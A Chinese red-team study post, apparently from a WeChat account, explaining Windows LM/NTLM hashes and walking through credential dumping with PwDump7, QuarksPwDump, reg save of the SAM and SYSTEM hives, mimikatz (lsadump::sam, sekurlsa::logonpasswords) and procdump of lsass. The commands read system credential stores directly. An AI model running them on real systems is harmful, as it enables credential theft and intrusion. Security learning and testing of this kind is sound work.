\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/FHgseKf12IrkJL-9DkUSpg)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **24** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

LM Hash 和 NTLM Hash

Windows 操作系统通常使用两种方法对用户的明文密码进行加密处理。

在域环境中，用户信息存储在 ntds.dit 中，加密后为散列值。

在 Windows 操作系统中，Hash 的结构通常如下：

```
username:RID:LM-HASH:NT-HASH
```

LM Hash（LAN Manager Hash）其本质是 DES 加密。在 Windows 2008 及开始之后默认禁用的是 LM Hash。

NTLM Hash 是基于 MD4 加密算法进行加密的，服务器从 Windows Server 2003 以后，Windows 操作系统的认证方式均为 NTLM Hash。

**Windows Hash 散列值抓取**

‍‍‍‍‍要想在 Windows 操作系统中抓取散列值或明文密码，必须将权限提升为 System。本地用户名，散列值和其他安全验证信息都保存在 SAM 文件中。

lsass.exe 进程用于实现 Windows 的安全策略（本地安全策略和登录策略）。可以使用工具将散列值和明文密码从内存中的 lsass.exe 进程或 SAM 文件中导出。‍‍‍‍‍

* * *

**GetPassword**

* * *

在命令行运行 Getpassword 即可获取明文密码

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLttiaoNTfKV8g2svLlLYcB5orianttfuWWibDhC8j5dicyLfFUZJuwR7YnSprYhYIMFvicO1Ah5XMDD8w/640?wx_fmt=png)

* * *

**PwDump7**

在命令行环境中运行 PwDump7 程序，可以得到系统中所有账户的 NTLM Hsh：（必须要有系统权限才能运行）

下载地址：https://download.openwall.net/pub/projects/john/contrib/pwdump/pwdump7.zip

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLttiaoNTfKV8g2svLlLYcB5sicibvLbicpD2FB4UolpE2mmDHoHtVicNWdcIb7puxaqd4bkicQVQGgDroQ/640?wx_fmt=png)

* * *

**QuarkPwDump**

在命令行下输入：导出三个用户的 NTML Hash

```
QuarksPwDump.exe --dump-hash-local
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLttiaoNTfKV8g2svLlLYcB5fvP5eaqAfcbicdicSqVMVuwPic9YjZHjuj7obBwib0k5Sh58R4aibwv8TjQ/640?wx_fmt=png)

QuarksPwDump 不过杀软。

* * *

**通过 SAM 和 System 文件抓取密码**

（1）导出 SAM 和 System 文件：通过 reg 的注册表导出

```
reg save hklm\\sam sam.hive
reg save hklm\\system system.hive
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLttiaoNTfKV8g2svLlLYcB5CiarUVMnGa8ZibiafhfiaAdEE15Qktx3vvmSSqgia6iafSGS7ZOvPQvicgt1A/640?wx_fmt=png)

（2）通过读取 SAM 和 System 文件获得 NTLM Hash

1、使用 mimikatz 读取 SAM 和 System 文件

将导出的 system.hive 和 sam.hive 文件放到 mimikatz 文件夹下，然后运行 mimikatz 命令：

```
lsadump::sam /sam:sam.hive /system:system.hive
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLttiaoNTfKV8g2svLlLYcB5q53oE4PsfOibDQphegCtT6zib1zEp8VZBQZPOGbuT0L22sBnGZic08ib6g/640?wx_fmt=png)

2、使用 mimikatz 直接读取本地 SAM 文件，导出 Hash 信息

该方法与 1 不同的是，需要在目标机器上运行 mimikatz：

```
#提升权限
privilege::debug
#提升权限为system
token::elevate
#读取本地SAM文件，获得NTLM Hash
lsadump::sam
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLttiaoNTfKV8g2svLlLYcB5BPdp6TDIeCLo1JY6OGkuic5nJMCDGkbnlzOGHNyhkoj9Ju6MPDNRicGQ/640?wx_fmt=png)

* * *

**使用 Mimikatz 在线读取 SAM 文件**

在目标 mimikatz 目录下运行命令，在线读取散列值及明文密码：

```
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLttiaoNTfKV8g2svLlLYcB5bCz9O3u22A1aicEMlQjsokaDroKt6ZiaibkTCv4ibHZI1Ty2DmMzH8c0pw/640?wx_fmt=png)

* * *

**使用 Mimikatz 离线读取 lsass.dmp 文件**

（1）导出 lsass.dmp 文件

通过 procdump.exe 文件导出 lsass.dmp 文件

procdump 下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

在命令行输入命令会生成一个 lsass.dmp 文件：

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLttiaoNTfKV8g2svLlLYcB5t7FYk0bYgicvNykgM264MAbtWZn83xnWsjvicFFX6FnGdR8UjWOhAnZg/640?wx_fmt=png)

（2）使用 mimikatz 导出 lsass.dmp 文件中的密码散列值

首先将导出的 lsass.dmp 文件放到 mimikatz 的目录下，然后输入命令：

如果有 **Switch to MINIDUMP** 说明加载成功

```
sekurlsa::minidump lsass.dmp
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLttiaoNTfKV8g2svLlLYcB5kINcG1QWQpHGbw8RbCEV8L0sJdn7PF9aC0KliaQ5OHXugEMwAJnMcKg/640?wx_fmt=png)

最后运行命令导出密码散列值：

```
sekurlsa::logonPasswords full
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLttiaoNTfKV8g2svLlLYcB5TSYfxk3UibOw0ud28hwBxQPpzy52FpQL1McDeVibCbYz0OknRFQvtTmQ/640?wx_fmt=png)

* * *

渗透攻击红队 发起了一个读者讨论 快来发表你的评论把！

参考文章：

https://zhuanlan.zhihu.com/p/220277028

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看